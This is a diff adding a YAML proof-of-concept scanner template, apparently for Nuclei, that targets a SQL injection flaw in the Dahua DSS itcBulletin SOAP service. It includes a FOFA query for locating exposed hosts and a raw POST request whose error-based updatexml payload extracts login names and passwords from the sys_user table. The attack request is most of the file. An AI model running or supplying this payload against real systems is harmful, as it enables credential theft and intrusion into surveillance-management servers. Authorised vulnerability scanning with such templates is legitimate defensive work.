@@ -1,0 +1,19 @@
+id: poc-zrtkq64tnvye1zg8
+info:
+  name: 大华 DSS itcBulletin SQL 注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zrtkq64tnvye1zg8'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zrtkq64tnvye1zg8
+    fofa: app="dahua-DSS"
+http:
+- raw:
+  - "POST /portal/services/itcBulletin?wsdl HTTP/1.1\n\nConnection: close\n\nAccept-Encoding: gzip\n\n\n\n<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>\n\n  <s11:Body>\n\n    <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>\n\n      <netMarkings>\n\n        (updatexml(1,concat(0x7e,(select substr(group_concat(login_name, \" \",login_pass),1,30) from sys_user),0x7e),1))) and (1=1\n\n      </netMarkings>\n\n    </ns1:deleteBulletin>\n\n  </s11:Body>\n\n</s11:Envelope>\n\n# 响应代码特征\n500\n\n# 响应内容特征\nsys_user\n\n# 上传文件定位\n暂无"
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
